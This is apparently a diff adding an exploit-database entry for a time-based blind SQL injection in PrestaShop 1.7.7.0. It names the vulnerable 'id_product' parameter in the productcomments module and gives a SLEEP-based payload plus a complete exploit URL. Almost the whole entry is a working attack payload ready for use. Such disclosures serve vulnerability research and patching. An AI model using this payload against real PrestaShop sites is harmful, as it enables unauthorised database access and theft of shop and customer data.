@@ -1,0 +1,14 @@
+# Exploit Title: Prestashop 1.7.7.0 - 'id_product' Time Based Blind SQL Injection
+# Date: 08-01-2021
+# Exploit Author: Jaimin Gondaliya
+# Vendor Homepage: https://www.prestashop.com
+# Software Link: https://www.prestashop.com/en/download
+# Version: Prestashop CMS - 1.7.7.0
+# Tested on: Windows 10
+
+Parameter: id_product
+
+Payload: 1 AND (SELECT 3875 FROM (SELECT(SLEEP(5)))xoOt)
+
+Exploit:
+http://localhost/shop//index.php?fc=module&module=productcomments&controller=CommentGrade&id_products[]=1%20AND%20(SELECT%203875%20FROM%20(SELECT(SLEEP(5)))xoOt)
